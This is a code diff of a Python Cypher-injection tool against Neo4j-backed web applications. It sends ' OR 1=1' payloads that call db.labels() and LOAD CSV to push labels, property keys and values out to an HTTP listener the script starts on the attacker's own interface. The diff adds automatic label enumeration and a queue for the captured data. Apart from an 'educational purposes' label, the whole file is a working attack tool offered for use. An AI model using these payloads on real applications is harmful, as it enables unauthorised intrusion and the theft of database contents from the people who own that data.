@@ -1,14 +1,24 @@
+#!/usr/bin/python3
 import argparse
 import requests
 import urllib.parse
 import threading
 import socket
 from http.server import HTTPServer, BaseHTTPRequestHandler
+import netifaces as ni
+import queue
+import re
+import sys
+
+# Initialize a queue to store received data
+data_queue = queue.Queue()
 
 class RequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Log the incoming GET request path (which could contain the data)
-        print(f"Received data: {self.path}")
+        #print(f"Received data: {self.path}")
+        # Put the received path into the queue
+        data_queue.put(self.path)
         # Send a basic HTTP response
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
@@ -20,17 +30,17 @@ class RequestHandler(BaseHTTPRequestHandler):
         return
 
 class Listener():
-    
     def __init__(self, port):
         self.server = HTTPServer(("0.0.0.0", port), RequestHandler)
 
     def start_listener(self):
-        print("starting listener...")
+        print("Starting listener...")
         self.server.serve_forever()
 
     def stop_listener(self):
-        print("stopping listener...")
+        print("Stopping listener...")
         self.server.shutdown()
+
 
 
 class Neo4jInjector:
@@ -75,64 +85,106 @@ class Neo4jInjector:
     def execute_request(self, url, data=None):
         try:
             if self.request_type == "POST":
-                response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies)
+                response = requests.post(url, data=data, headers=self.headers, allow_redirects=False)
+                # print(response.status_code)
+                # print(response.text)
+             
             else:
-                response = requests.get(url, headers=self.headers, proxies=self.proxies)
+                response = requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
+                print("get")
 
-            if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
+            if response.status_code == 302:
+                print("302 Redirect, Cookies Expired/Invalid ?")
+                sys.exit()
+
+            elif response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
+                print(response.status_code)
                 print(f"Payload Injected")
+
+
 
         except requests.exceptions.RequestException as e:
             print(f"Error occurred: {e}")
 
     def exfil_data(self):
+
+        print("Dumping labels count")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM 'http://{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 // ")
+
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        label_count = parsed_data.get('label_count', None)  # Extract the label value
+        print(label_count)
+
         print("Dumping Labels")
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM 'http://{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
-        label = input("Enter Label: ")
 
-        print("Dumping Properties")
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
+        # Store labels
+        labels = []
+        for i in range(int(label_count)):
+            data = data_queue.get()  # Retrieve the next item from the queue
+            parsed_data = extract_query_params(data)  # Use the previously defined function
+            label_value = parsed_data.get('label', None)  # Extract the label value
+            labels.append(label_value)
 
-        print("Dumping Value of Properties")
+
+        label = input(f"Select label to dump {labels}: ")
+
+        # print("Dumping Properties")
+        # self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
+
+        print("Dumping Values Property=Value")
         self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM 'http://{self.exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
+
+def get_ip_address(network_interface):
+    return ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']
+
+def extract_query_params(query_string):
+    pattern = re.compile(r'([^&=?]+)=([^&=?]+)')
+    matches = pattern.findall(query_string)
+    params = {key: value for key, value in matches}
+    return params
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
-    parser.add_argument("-l", "--exfil-ip", required=False, help="Exfiltration IP, ommitting this arg will make the program start its own listener")
-    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type: API/GET/POST")
     parser.add_argument("-p", "--parameters", required=False, default="", help="Vulnerable parameters")
     parser.add_argument("-c", "--cookie", required=False, help="Optional cookie in format key=value")
+    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type: API/GET/POST")
+    parser.add_argument("-i", "--int", required=False, help="Network interface for dynamic IP retrieval")
     parser.add_argument("--listen-port", required=False, type=int, default=80, help="Port for the listener to capture incoming data")
-
     args = parser.parse_args()
 
     if ((args.type == "GET" or args.type == "POST") and args.parameters == ""):
-        print("parameter required for GET and POST methods")
+        print("Parameter required for GET and POST methods")
         return
-    
-    # 
-    if (not args.exfil_ip):
-        hostname = socket.gethostname()
-        args.exfil_ip = socket.gethostbyname(hostname)
 
-        # Start the listener in a separate thread
-        listener = Listener(args.listen_port)
-        listener_thread = threading.Thread(target=listener.start_listener)
-        listener_thread.daemon = True
-        listener_thread.start()
+    if args.int:
+        try:
+            args.exfil_ip = get_ip_address(args.int)
+        except ValueError:
+            print("Error retrieving IP for specified interface")
+            return
     else:
-        listener = None
+        args.exfil_ip = "127.0.0.1"
+
+    listener = Listener(args.listen_port)
+    listener_thread = threading.Thread(target=listener.start_listener)
+    listener_thread.daemon = True
+    listener_thread.start()
+
 
     injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
-
-    # Begin exfiltration process
     injector.exfil_data()
 
-    if (listener):
-        # Shutdown the listener and join the thread
-        listener.stop_listener()
-        listener_thread.join()
+    # Process data from the queue
+    while not data_queue.empty():
+        received_path = data_queue.get()
+        print(f"Processing received data: {received_path}")
+        # Here you can process the data as needed
+
+    listener.stop_listener()
+    listener_thread.join()
 
 if __name__ == "__main__":
     main()
